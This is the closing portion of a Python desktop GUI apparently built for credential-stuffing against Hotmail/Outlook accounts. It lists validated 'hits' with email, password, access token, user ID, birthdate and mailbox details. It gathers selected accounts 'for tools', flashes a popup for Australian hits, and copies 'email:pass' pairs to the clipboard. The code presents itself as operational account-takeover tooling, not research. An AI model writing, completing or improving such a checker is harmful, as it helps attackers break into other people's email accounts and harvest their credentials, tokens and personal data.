        current = self.tree.set(item_id, "Select")
        new_val = "[x]" if current == "[ ]" else "[ ]"
        self.tree.set(item_id, "Select", new_val)
        idx = self.tree.index(item_id)
        if idx < len(self.results_data):
            info = self.results_data[idx]
            if new_val == "[x]":
                if not any(d['email'] == info['email'] for d in self.selected_hits_for_tools):
                    self.selected_hits_for_tools.append({
                        'email': info['email'],
                        'access_token': info['access_token'],
                        'user_id': info['user_id'],
                        'dob': info['birthdate'],
                        'mailbox_lang': info['mailbox_lang'],
                        'mailbox_tz': info['mailbox_tz']
                    })
                info['checkbox_state'] = True
            else:
                self.selected_hits_for_tools = [d for d in self.selected_hits_for_tools if d['email'] != info['email']]
                info['checkbox_state'] = False

    def sort_table(self, col):
        reverse = False
        if hasattr(self, 'last_sort') and self.last_sort == col:
            reverse = True
            self.last_sort = None
        else:
            self.last_sort = col
        if col == "email":
            self.results_data.sort(key=lambda x: x["email"].lower(), reverse=reverse)
        elif col == "country":
            self.results_data.sort(key=lambda x: x["country"], reverse=reverse)
        elif col == "name":
            self.results_data.sort(key=lambda x: x["name"], reverse=reverse)
        elif col == "birthdate":
            self.results_data.sort(key=lambda x: x["birthdate"], reverse=reverse)
        for row in self.tree.get_children():
            self.tree.delete(row)
        for info in self.results_data:
            is_selected = info.get('checkbox_state', False)
            check_mark = "[x]" if is_selected else "[ ]"
            values = (
                check_mark,
                info["email"], info["password"], info["country"], info["name"],
                info["birthdate"], info["mailbox_lang"], info["mailbox_tz"],
                info["total"] if info["has_keyword"] else "0"
            )
            self.tree.insert("", "end", values=values)

    def show_giant_popup(self, info):
        popup = ctk.CTkToplevel(self.root)
        popup.title("AUSTRALIA ACCOUNT DETECTED")
        popup.geometry("600x400")
        popup.attributes('-topmost', True)
        popup.configure(fg_color="#ff8c00")
        label = ctk.CTkLabel(popup, text="AUSTRALIA HIT!", font=("Courier",24,"bold"),
                             text_color="black")
        label.pack(pady=20)
        details = f"Email: {info['email']}\nPassword: {info['password']}\nCountry: {info['country']}\nName: {info['name']}\nBirth: {info['birthdate']}\nMailbox Lang: {info['mailbox_lang']}\nTimezone: {info['mailbox_tz']}"
        det_label = ctk.CTkLabel(popup, text=details, font=("Courier",14), justify="left",
                                 text_color="black")
        det_label.pack(pady=10)
        def copy_creds():
            pyperclip.copy(f"{info['email']}:{info['password']}")
            copy_btn.configure(text="COPIED!", state="disabled")
            popup.after(2000, popup.destroy)
        copy_btn = ctk.CTkButton(popup, text="COPY EMAIL:PASS", command=copy_creds,
                                 fg_color="black", text_color="orange", font=("Courier",12,"bold"))
        copy_btn.pack(pady=10)
        close_btn = ctk.CTkButton(popup, text="CLOSE", command=popup.destroy,
                                  fg_color="red", text_color="white")
        close_btn.pack(pady=5)
        popup.after(30000, popup.destroy)

    def log_raw(self, msg, level):
        color_map = {"bad":"red", "good":"lime", "info":"yellow"}
        color = color_map.get(level, "white")
        self.root.after(0, lambda: self.raw_log.insert("end", msg + "\n", color))
        self.raw_log.see("end")

    def update_stats(self, stats):
        self.stats = stats
        self.root.after(0, self.update_stats_label)

    def update_stats_label(self):
        self.stats_label.configure(text=f"Hits:{self.stats['hits']} | Custom:{self.stats['custom']} | Bad:{self.stats['bad']}")

    def update_progress(self, processed, total):
        self.root.after(0, lambda: self.progress.set(processed/total))

    def check_finished(self, stats):
        self.running = False
        self.start_btn.configure(state="normal")
        self.stop_btn.configure(state="disabled")
        self.log_raw(f"[INFO] Finished. Hits:{stats['hits']}, Custom:{stats['custom']}, Bad:{stats['bad']}", "info")
        if self.temp_file and os.path.exists(self.temp_file.name):
            try:
                os.unlink(self.temp_file.name)
                self.log_raw("[INFO] Temp file deleted", "info")
            except:
                pass

    def poll_queues(self):
        self.root.after(100, self.poll_queues)

    def on_closing(self):
        if self.running and self.checker:
            self.checker.stop()
        if self.temp_file and os.path.exists(self.temp_file.name):
            try:
                os.unlink(self.temp_file.name)
            except:
                pass
        self.root.destroy()


# ==================== MAIN ENTRY POINT ====================
def show_splash_then_main():
    """Show splash screen then launch main application"""
    def launch_main():
        app = HotmailUltimateGUI()
        app.root.mainloop()

    splash = FuturisticSplashScreen(on_complete=launch_main)
    splash.show()


if __name__ == "__main__":
    show_splash_then_main()
